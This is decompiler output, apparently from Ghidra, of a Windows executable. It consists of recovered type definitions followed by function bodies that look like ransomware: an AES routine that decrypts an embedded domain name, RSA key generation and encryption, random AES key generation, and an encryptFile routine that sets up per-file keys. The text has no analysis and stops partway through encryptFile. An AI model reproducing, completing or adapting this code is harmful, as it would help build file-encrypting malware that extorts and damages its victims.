typedef unsigned char   undefined;

typedef unsigned int    ImageBaseOffset32;
typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef long long    longlong;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned short    ushort;
typedef unsigned short    word;
typedef unsigned short    wchar16;
typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _SYSTEM_INFO _SYSTEM_INFO, *P_SYSTEM_INFO;

typedef struct _SYSTEM_INFO * LPSYSTEM_INFO;

typedef union _union_530 _union_530, *P_union_530;

typedef ulong DWORD;

typedef void * LPVOID;

typedef ulong ULONG_PTR;

typedef ULONG_PTR DWORD_PTR;

typedef ushort WORD;

typedef struct _struct_531 _struct_531, *P_struct_531;

struct _struct_531 {
    WORD wProcessorArchitecture;
    WORD wReserved;
};

union _union_530 {
    DWORD dwOemId;
    struct _struct_531 s;
};

struct _SYSTEM_INFO {
    union _union_530 u;
    DWORD dwPageSize;
    LPVOID lpMinimumApplicationAddress;
    LPVOID lpMaximumApplicationAddress;
    DWORD_PTR dwActiveProcessorMask;
    DWORD dwNumberOfProcessors;
    DWORD dwProcessorType;
    DWORD dwAllocationGranularity;
    WORD wProcessorLevel;
    WORD wProcessorRevision;
};

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef char CHAR;

typedef CHAR * LPSTR;

typedef uchar BYTE;

typedef BYTE * LPBYTE;

typedef void * HANDLE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _WIN32_FIND_DATAA _WIN32_FIND_DATAA, *P_WIN32_FIND_DATAA;

typedef struct _WIN32_FIND_DATAA * LPWIN32_FIND_DATAA;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

struct _WIN32_FIND_DATAA {
    DWORD dwFileAttributes;
    FILETIME ftCreationTime;
    FILETIME ftLastAccessTime;
    FILETIME ftLastWriteTime;
    DWORD nFileSizeHigh;
    DWORD nFileSizeLow;
    DWORD dwReserved0;
    DWORD dwReserved1;
    CHAR cFileName[260];
    CHAR cAlternateFileName[14];
};

typedef struct _STARTUPINFOA * LPSTARTUPINFOA;

typedef struct tagHW_PROFILE_INFOA tagHW_PROFILE_INFOA, *PtagHW_PROFILE_INFOA;

struct tagHW_PROFILE_INFOA {
    DWORD dwDockInfo;
    CHAR szHwProfileGuid[39];
    CHAR szHwProfileName[80];
};

typedef struct tagHW_PROFILE_INFOA * LPHW_PROFILE_INFOA;

typedef struct _OFSTRUCT _OFSTRUCT, *P_OFSTRUCT;

struct _OFSTRUCT {
    BYTE cBytes;
    BYTE fFixedDisk;
    WORD nErrCode;
    WORD Reserved1;
    WORD Reserved2;
    CHAR szPathName[128];
};

typedef struct _OFSTRUCT * LPOFSTRUCT;

typedef long LONG;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef LONG (* PTOP_LEVEL_EXCEPTION_FILTER)(struct _EXCEPTION_POINTERS *);

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD * PEXCEPTION_RECORD;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT * PCONTEXT;

typedef void * PVOID;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD * ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct _SECURITY_ATTRIBUTES * LPSECURITY_ATTRIBUTES;

typedef PTOP_LEVEL_EXCEPTION_FILTER LPTOP_LEVEL_EXCEPTION_FILTER;

typedef CHAR * LPCSTR;

typedef PVOID PSID;

typedef struct _SID_IDENTIFIER_AUTHORITY _SID_IDENTIFIER_AUTHORITY, *P_SID_IDENTIFIER_AUTHORITY;

struct _SID_IDENTIFIER_AUTHORITY {
    BYTE Value[6];
};

typedef struct _SID_IDENTIFIER_AUTHORITY * PSID_IDENTIFIER_AUTHORITY;

typedef DWORD ACCESS_MASK;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ULONG_PTR HCRYPTKEY;

typedef ULONG_PTR HCRYPTHASH;

typedef uint ALG_ID;

typedef ULONG_PTR HCRYPTPROV;

typedef uint UINT_PTR;

typedef ULONG_PTR SIZE_T;

typedef struct in_addr in_addr, *Pin_addr;

typedef union _union_1226 _union_1226, *P_union_1226;

typedef struct _struct_1227 _struct_1227, *P_struct_1227;

typedef struct _struct_1228 _struct_1228, *P_struct_1228;

typedef ulong ULONG;

typedef uchar UCHAR;

typedef ushort USHORT;

struct _struct_1228 {
    USHORT s_w1;
    USHORT s_w2;
};

struct _struct_1227 {
    UCHAR s_b1;
    UCHAR s_b2;
    UCHAR s_b3;
    UCHAR s_b4;
};

union _union_1226 {
    struct _struct_1227 S_un_b;
    struct _struct_1228 S_un_w;
    ULONG S_addr;
};

struct in_addr {
    union _union_1226 S_un;
};

typedef USHORT ADDRESS_FAMILY;

typedef int (* FARPROC)(void);

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef DWORD * LPDWORD;

typedef struct HKEY__ * HKEY;

typedef HKEY * PHKEY;

typedef int INT;

typedef WORD ATOM;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

struct HINSTANCE__ {
    int unused;
};

typedef int HFILE;

typedef struct HINSTANCE__ * HINSTANCE;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ * HWND;

struct HWND__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef HANDLE HLOCAL;

typedef uint UINT;

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct Var Var, *PVar;

struct Var {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct StringFileInfo StringFileInfo, *PStringFileInfo;

struct StringFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct StringTable StringTable, *PStringTable;

struct StringTable {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct VS_VERSION_INFO VS_VERSION_INFO, *PVS_VERSION_INFO;

struct VS_VERSION_INFO {
    word StructLength;
    word ValueLength;
    word StructType;
    wchar16 Info[16];
    byte Padding[2];
    dword Signature;
    word StructVersion[2];
    word FileVersion[4];
    word ProductVersion[4];
    dword FileFlagsMask[2];
    dword FileFlags;
    dword FileOS;
    dword FileType;
    dword FileSubtype;
    dword FileTimestamp;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct VarFileInfo VarFileInfo, *PVarFileInfo;

struct VarFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct StringInfo StringInfo, *PStringInfo;

struct StringInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct _iobuf _iobuf, *P_iobuf;

struct _iobuf {
    char * _ptr;
    int _cnt;
    char * _base;
    int _flag;
    int _file;
    int _charbuf;
    int _bufsiz;
    char * _tmpfname;
};

typedef struct _iobuf FILE;

typedef LONG LSTATUS;

typedef ACCESS_MASK REGSAM;

typedef uint uintptr_t;

typedef struct sockaddr sockaddr, *Psockaddr;

struct sockaddr {
    ADDRESS_FAMILY sa_family;
    CHAR sa_data[14];
};

typedef struct WSAData WSAData, *PWSAData;

typedef struct WSAData WSADATA;

struct WSAData {
    WORD wVersion;
    WORD wHighVersion;
    char szDescription[257];
    char szSystemStatus[129];
    ushort iMaxSockets;
    ushort iMaxUdpDg;
    char * lpVendorInfo;
};

typedef UINT_PTR SOCKET;

typedef WSADATA * LPWSADATA;

typedef ushort u_short;

typedef struct hostent hostent, *Phostent;

struct hostent {
    char * h_name;
    char * * h_aliases;
    short h_addrtype;
    short h_length;
    char * * h_addr_list;
};

typedef int (* _onexit_t)(void);

typedef uint size_t;

typedef longlong __time64_t;

typedef __time64_t time_t;

typedef struct _startupinfo _startupinfo, *P_startupinfo;

struct _startupinfo {
    int newmode;
};




void ___mingw_CRTStartup(void)

{
  int *piVar1;
  undefined4 *puVar2;
  UINT uExitCode;
  char **local_10;
  _startupinfo local_c;
  
  _SetUnhandledExceptionFilter_4((LPTOP_LEVEL_EXCEPTION_FILTER)&LAB_00401000);
  __fpreset();
  local_c = 0;
  ___getmainargs(&__argc,&DAT_0040e000,&local_10,__CRT_glob,&local_c);
  if (__CRT_fmode != 0) {
    __fmode = __CRT_fmode;
    if (_iob_exref != (code *)0x0) {
      __setmode(*(int *)(_iob_exref + 0x10),__CRT_fmode);
    }
    if (_iob_exref != (code *)0xffffffe0) {
      __setmode(*(int *)(_iob_exref + 0x30),__CRT_fmode);
    }
    if (_iob_exref != (code *)0xffffffc0) {
      __setmode(*(int *)(_iob_exref + 0x50),__CRT_fmode);
    }
  }
  piVar1 = (int *)___p__fmode();
  *piVar1 = __fmode;
  __pei386_runtime_relocator();
  puVar2 = (undefined4 *)___p__environ();
  uExitCode = _main(__argc,DAT_0040e000,(char **)*puVar2);
  __cexit();
                    // WARNING: Subroutine does not return
  _ExitProcess_4(uExitCode);
}



void _WinMainCRTStartup(void)

{
  __set_app_type(2);
                    // WARNING: Subroutine does not return
  ___mingw_CRTStartup();
}



// WARNING: Exceeded maximum restarts with more pending

void _atexit(void)

{
                    // WARNING: Could not recover jumptable at 0x0040126a. Too many branches
                    // WARNING: Treating indirect jump as call
  atexit();
  return;
}



void __cdecl __Z14decrypt_domainPc(byte *param_1)

{
  int iVar1;
  undefined *puVar2;
  int local_2a0;
  uint local_29c [132];
  byte local_8c [48];
  undefined local_5c;
  undefined local_5b;
  undefined local_5a;
  undefined local_59;
  undefined local_58;
  undefined local_57;
  undefined local_56;
  undefined local_55;
  undefined local_54;
  undefined local_53;
  undefined local_52;
  undefined local_51;
  undefined local_50;
  undefined local_4f;
  undefined local_4e;
  undefined local_4d;
  undefined local_4c;
  undefined local_4b;
  undefined local_4a;
  undefined local_49;
  undefined local_48;
  undefined local_47;
  undefined local_46;
  undefined local_45;
  undefined local_44;
  undefined local_43;
  undefined local_42;
  undefined local_41;
  undefined local_40;
  undefined local_3f;
  undefined local_3e;
  undefined local_3d;
  undefined local_3c;
  undefined local_2c [4];
  undefined local_28;
  undefined local_27;
  undefined local_26;
  undefined local_25;
  undefined local_24;
  undefined local_23;
  undefined local_22;
  undefined local_21;
  undefined local_20;
  undefined local_1f;
  undefined local_1e;
  undefined local_1c;
  undefined local_1b;
  undefined local_1a;
  undefined local_19;
  undefined local_18;
  undefined local_17;
  undefined local_15;
  
  puVar2 = local_2c;
  for (iVar1 = 0x19; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  local_2c[0] = 0x33;
  local_2c[1] = 0x15;
  local_2c[2] = 6;
  local_2c[3] = 8;
  local_28 = 1;
  local_27 = 2;
  local_26 = 0x41;
  local_25 = 0x12;
  local_24 = 0x13;
  local_23 = 0xde;
  local_22 = 0xb;
  local_21 = 0x6f;
  local_20 = 0x21;
  local_1f = 0x4d;
  local_1e = 0x37;
  local_1c = 5;
  local_1b = 0xb;
  local_1a = 0x6f;
  local_19 = 0x21;
  local_18 = 0x4d;
  local_17 = 0x37;
  local_15 = 5;
  local_5c = 0xf;
  local_5b = 0xbd;
  local_5a = 0xd7;
  local_59 = 0x8e;
  local_58 = 0xc;
  local_57 = 1;
  local_56 = 2;
  local_55 = 5;
  local_54 = 6;
  local_53 = 9;
  local_52 = 9;
  local_51 = 6;
  local_50 = 5;
  local_4f = 4;
  local_4e = 8;
  local_4d = 5;
  local_4c = 2;
  local_4b = 0xf;
  local_4a = 0x38;
  local_49 = 0xd4;
  local_48 = 0x21;
  local_47 = 0xd;
  local_46 = 0x25;
  local_45 = 0x15;
  local_44 = 1;
  local_43 = 0x36;
  local_42 = 0x54;
  local_41 = 0x20;
  local_40 = 0xb2;
  local_3f = 0x5f;
  local_3e = 0x15;
  local_3d = 0x16;
  local_3c = 0xd4;
  _aes_set_key(local_29c,(int)&local_5c,0x100);
  _aes_cbc_decrypt((int)local_29c,local_2c,param_1,local_8c,0x21);
  for (local_2a0 = 0; local_2a0 < 0x21; local_2a0 = local_2a0 + 1) {
    param_1[local_2a0] = local_8c[local_2a0];
  }
  return;
}



undefined4 __cdecl
__Z15generateRSAkeysPhPmS_S0_(BYTE *param_1,DWORD *param_2,BYTE *param_3,DWORD *param_4)

{
  BOOL BVar1;
  DWORD DVar2;
  undefined4 local_24;
  HCRYPTKEY local_c;
  HCRYPTPROV local_8;
  
  BVar1 = _CryptAcquireContextA_20
                    (&local_8,(LPCSTR)0x0,"Microsoft Enhanced Cryptographic Provider v1.0",1,0);
  if (BVar1 == 0) {
    DVar2 = _GetLastError_0();
    if (DVar2 != 0x80090016) {
      return 0;
    }
    BVar1 = _CryptAcquireContextA_20
                      (&local_8,(LPCSTR)0x0,"Microsoft Enhanced Cryptographic Provider v1.0",1,8);
    if (BVar1 == 0) {
      return 0;
    }
  }
  _CryptGenKey_16(local_8,0xa400,0x8000001,&local_c);
  _CryptExportKey_24(local_c,0,6,0,param_1,param_2);
  _CryptExportKey_24(local_c,0,7,0,param_3,param_4);
  return local_24;
}



BOOL __cdecl __Z11encrypt_RSAPhmPcPm(BYTE *param_1,DWORD param_2,BYTE *param_3,DWORD *param_4)

{
  BOOL BVar1;
  HCRYPTKEY local_c;
  HCRYPTPROV local_8;
  
  local_8 = 0;
  local_c = 0;
  _CryptAcquireContextA_20
            (&local_8,(LPCSTR)0x0,"Microsoft Enhanced Cryptographic Provider v1.0",1,0);
  _CryptImportKey_24(local_8,param_1,param_2,0,0,&local_c);
  BVar1 = _CryptEncrypt_28(local_c,0,1,0,param_3,param_4,param_2);
  return BVar1;
}



BOOL __cdecl __Z11decrypt_RSAPhmPcPm(BYTE *param_1,DWORD param_2,BYTE *param_3,DWORD *param_4)

{
  BOOL BVar1;
  HCRYPTKEY local_c;
  HCRYPTPROV local_8;
  
  local_8 = 0;
  local_c = 0;
  _CryptAcquireContextA_20
            (&local_8,(LPCSTR)0x0,"Microsoft Enhanced Cryptographic Provider v1.0",1,0);
  _CryptImportKey_24(local_8,param_1,param_2,0,0,&local_c);
  BVar1 = _CryptDecrypt_24(local_c,0,1,0,param_3,param_4);
  return BVar1;
}



void __cdecl __Z14genereteAESkeyPh(int param_1)

{
  int iVar1;
  int local_8;
  
  for (local_8 = 0; local_8 < 0x20; local_8 = local_8 + 1) {
    iVar1 = _rand();
    *(char *)(local_8 + param_1) = (char)iVar1;
    iVar1 = _rand();
    _Sleep_4(iVar1 % 3);
  }
  return;
}



undefined4 __cdecl __Z11encryptFilePcS_Phm(char *param_1,char *param_2,BYTE *param_3,DWORD param_4)

{
  char cVar1;
  byte *_DstBuf;
  byte *_Memory;
  int iVar2;
  byte *pbVar3;
  size_t local_938;
  FILE *local_934;
  FILE *local_930;
  int local_92c;
  int local_928;
  size_t local_924;
  size_t local_920;
  uint local_91c [132];
  uint local_70c [132];
  uint local_4fc [132];
  BYTE local_2ec [304];
  undefined4 local_1bc;
  undefined4 local_1b8;
  undefined4 local_1b4;
  undefined4 local_1b0;
  undefined4 local_1ac;
  undefined4 local_1a8;
  undefined4 local_1a4;
  undefined4 local_1a0;
  undefined local_19c;
  undefined4 local_18c;
  undefined4 local_188;
  undefined4 local_184;
  undefined4 local_180;
  undefined4 local_17c;
  undefined4 local_178;
  undefined4 local_174;
  undefined4 local_170;
  undefined local_16c;
  undefined4 local_15c;
  undefined4 local_158;
  undefined4 local_154;
  undefined4 local_150;
  undefined4 local_14c;
  undefined4 local_148;
  undefined4 local_144;
  undefined4 local_140;
  undefined local_13c;
  undefined4 local_12c;
  undefined4 local_128;
  undefined4 local_124;
  undefined4 local_120;
  undefined4 local_11c;
  undefined4 local_118;
  undefined4 local_114;
  undefined4 local_110;
  undefined local_10c;
  undefined4 local_fc;
  undefined4 local_f8;
  undefined4 local_f4;
  undefined4 local_f0;
  undefined4 local_ec;
  undefined4 local_e8;
  undefined4 local_e4;
  undefined4 local_e0;
  undefined local_dc;
  undefined4 local_cc;
  undefined4 local_c8;
  undefined4 local_c4;
  undefined4 local_c0;
  undefined4 local_bc;
  undefined4 local_b8;
  undefined4 local_b4;
  undefined4 local_b0;
  undefined local_ac;
  undefined4 local_9c;
  undefined4 local_98;
  undefined4 local_94;
  undefined4 local_90;
  undefined4 local_8c;
  undefined4 local_88;
  undefined4 local_84;
  undefined4 local_80;
  undefined local_7c;
  undefined4 local_6c;
  undefined4 local_68;
  undefined4 local_64;
  undefined4 local_60;
  undefined4 local_5c;
  undefined4 local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined local_4c;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined local_1c;
  
  local_3c = 0x34333236;
  local_38 = 0x38373635;
  local_34 = 0x32313039;
  local_30 = 0x36353433;
  local_2c = 0x30393837;
  local_28 = 0x34333231;
  local_24 = 0x38373635;
  local_20 = 0x32313039;
  local_1c = 0;
  local_6c = 0x34333236;
  local_68 = 0x38373635;
  local_64 = 0x32313039;
  local_60 = 0x36353433;
  local_5c = 0x30393837;
  local_58 = 0x34333231;
  local_54 = 0x38373635;
  local_50 = 0x32313039;
  local_4c = 0;
  local_9c = 0x34333236;
  local_98 = 0x38373635;
  local_94 = 0x32313039;
  local_90 = 0x36353433;
  local_8c = 0x30393837;
  local_88 = 0x34333231;
  local_84 = 0x38373635;
  local_80 = 0x32313039;
  local_7c = 0;
  local_cc = 0x34333231;
  local_c8 = 0x38373635;
  local_c4 = 0x32313039;
  local_c0 = 0x36353433;
  local_bc = 0x30393837;
  local_b8 = 0x34333231;
  local_b4 = 0x38373635;
  local_b0 = 0x32313039;
  local_ac = 0;
  local_fc = 0x34333232;
  local_f8 = 0x38373635;
  local_f4 = 0x32313039;
  local_f0 = 0x36353433;
  local_ec = 0x30393837;
  local_e8 = 0x34333231;
  local_e4 = 0x38373635;
  local_e0 = 0x32313039;
  local_dc = 0;
  local_12c = 0x34333233;
  local_128 = 0x38373635;
  local_124 = 0x32313039;
  local_120 = 0x36353433;
  local_11c = 0x30393837;
  local_118 = 0x34333231;
  local_114 = 0x38373635;
  local_110 = 0x32313039;
  local_10c = 0;
  local_15c = 0x34333234;
  local_158 = 0x38373635;
  local_154 = 0x32313039;
  local_150 = 0x36353433;
  local_14c = 0x30393837;
  local_148 = 0x34333231;
  local_144 = 0x38373635;
  local_140 = 0x32313039;
  local_13c = 0;
  local_18c = 0x34333235;
  local_188 = 0x38373635;
  local_184 = 0x32313039;
  local_180 = 0x36353433;
  local_17c = 0x30393837;
  local_178 = 0x34333231;
  local_174 = 0x38373635;
  local_170 = 0x32313039;
  local_16c = 0;
  local_1bc = 0x34333236;
  local_1b8 = 0x38373635;
  local_1b4 = 0x32313039;
  local_1b0 = 0x36353433;
  local_1ac = 0x30393837;
  local_1a8 = 0x34333231;
  local_1a4 = 0x38373635;
  local_1a0 = 0x32313039;
  local_19c = 0;
  local_924 = 0x10;
  __Z14genereteAESkeyPh((int)&local_15c);
  __Z14genereteAESkeyPh((int)&local_cc);
  __Z14genereteAESkeyPh((int)&local_18c);
  __Z14genereteAESkeyPh((int)&local_fc);
  __Z14genereteAESkeyPh((int)&local_1bc);
  __Z14genereteAESkeyPh((int)&local_12c);
  local_92c = 0;
  for (local_928 = 0; local_928 < 0x21; local_928 = local_928 + 1) {
    local_2ec[local_92c] = *(BYTE *)((int)&local_15c + local_928);
    local_92c = local_92c + 1;
  }
  for (local_928 = 0; local_928 < 0x21; local_928 = local_928 + 1) {
    local_2ec[local_92c] = *(BYTE *)((int)&local_18c + local_928);
    local_92c = local_92c + 1;
  }
